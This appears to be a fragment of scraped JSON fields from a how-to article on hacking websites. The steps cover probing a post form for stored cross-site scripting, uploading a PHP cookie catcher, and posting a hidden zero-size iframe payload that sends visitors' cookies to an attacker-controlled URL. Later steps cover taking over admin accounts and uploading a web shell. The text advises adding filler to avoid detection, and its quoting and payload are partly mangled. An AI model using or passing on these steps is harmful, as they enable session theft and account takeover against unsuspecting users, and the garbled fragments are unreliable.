      "content": "Go to create a post. You will need to type some special code into the \"post\" which will capture the data of all who click on it. You'll want to test to see if the system filters out code. Post <script>window.alert(\"test\")</script> If an alert box appears when you click on your post, then the site is vulnerable to attack."

      "content": "Create and upload your cookie catcher. The goal of this attack is to capture a user's cookies, which allows you access to their account for websites with vulnerable logins. You'll need a cookie catcher, which will capture your target's cookies and reroute them. Upload the catcher to a website you have access to that supports PHP and is vulnerable to remote code execution via upload. An example cookie catcher code can be found in the sample section."

      "title": "Post with your cookie catcher.",
      "content": "Post with your cookie catcher. Input a proper code into the post which will capture the cookies and sent them to your site. You will want to put in some text after the code to reduce suspicion and keep your post from being deleted. An example code would look like <iframe frameborder=\"0\" height=\"0\" width=\"0\" src=\"javascript...:void(document.location='YOURURL/cookie catcher.PHP?c=' document.cookie)></iframe>"

      "content": "Access the website. Eventually, you should be able to find a string that allows you admin access to a website, assuming the website is vulnerable to attack. Then, logged in as an administrator, you can perform further actions, such as uploading a web shell to gain server-side access if you can perform a file upload."

      "content": "Learn a programming language or two. If you want to learn how to hack websites, you'll need to understand how computers and other technologies work. Learn to use programming languages like Python , PHP (necessary for exploiting server-side vulnerabilities), or SQL, so that you can gain better control of computers and identify vulnerabilities in systems."

This can take time to learn but there are lots of free ways to learn on the internet, so you will certainly have the opportunity if you want to take it."
